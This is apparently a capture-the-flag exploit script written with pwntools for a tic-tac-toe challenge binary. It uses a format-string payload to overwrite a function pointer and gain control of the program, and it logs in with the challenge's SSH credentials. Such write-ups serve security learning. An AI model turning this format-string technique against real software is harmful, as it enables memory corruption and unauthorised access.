#!/usr/bin/env python3
import libformatstr
from pwn import *

if args.LOCAL:
    io = process(['./ttt'], env={**os.environ, 'TERM': 'xterm'})
    gdb.attach(io, gdbscript='''
b endwin
c
''')
else:
    s = ssh(user='ttt', host='challenges2.hexionteam.com', port=3004, password='hexctf')
    io = s.shell()
    io.recvuntil('~$')
    io.sendline('TERM=xterm ./ttt')
io.recvuntil('Please enter your name: ')
fmt = libformatstr.FormatStr(isx64=True)
# DIFFICULTY = getchar@0x400e20 (was IMPOSSIBLE@0x401cd5)
fmt[0x603010] = struct.pack('<H', 0x0e20)
# (gdb) b *0x40223e
# (gdb) x/s $rsp + 0x10
# 0x7ffd483d24a0:	"%3608c...
# "Welcome %s!\n"
io.sendline(fmt.payload(arg_index=8, start_len=8))
io.recvuntil('Press ENTER to begin.')
io.sendline()
# Mixed inputs and DIFFICULTY() results.
io.send(''.join(random.choices('wasd ', k=1000)) + 'q')
io.interactive()
